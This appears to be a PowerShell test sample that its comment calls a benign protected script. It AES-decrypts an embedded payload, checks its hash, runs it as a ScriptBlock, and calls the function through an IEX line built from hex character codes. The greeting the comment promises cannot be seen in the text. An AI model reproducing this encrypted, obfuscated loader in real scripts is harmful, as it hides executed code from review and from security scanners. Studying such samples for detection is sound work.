# Benign protected script: decrypted payload only writes a greeting.
function Invoke-Update {
    $keyText = 'MDEyMzQ1Njc4OUFCQ0RFRjAxMjM0NTY3ODlBQkNERUY='
    $ivText = 'QUJDREVGR0hJSktMTU5PUA=='
    $cipherText = 'tnDC8lKo3WN/bG9DAPsvs6M9ubGOlJKNEpavFRqcHzi3Z9KGIinNBNReSSw24BO1'
    $aes = [System.Security.Cryptography.Aes]::Create()
    $aes.Key = [Convert]::FromBase64String($keyText)
    $aes.IV = [Convert]::FromBase64String($ivText)
    $encrypted = [Convert]::FromBase64String($cipherText)
    $decryptor = $aes.CreateDecryptor()
    $plain = $decryptor.TransformFinalBlock($encrypted, 0, $encrypted.Length)
    $hash = [System.Security.Cryptography.SHA256]::Create()
    $actual = [BitConverter]::ToString($hash.ComputeHash($plain)).Replace('-', '').ToLowerInvariant()
    if ($actual -eq '9593cdf1ec74d9795c0dc739f92df00b105675344e253de6f9d28ab78b279919') {
        $source = [System.Text.Encoding]::UTF8.GetString($plain)
        & ([ScriptBlock]::Create($source))
    }
    $decryptor.Dispose()
    $aes.Dispose()
}
IEX (-join [char[]]@(0x49,0x6e,0x76,0x6f,0x6b,0x65,0x2d,0x55,0x70,0x64,0x61,0x74,0x65))
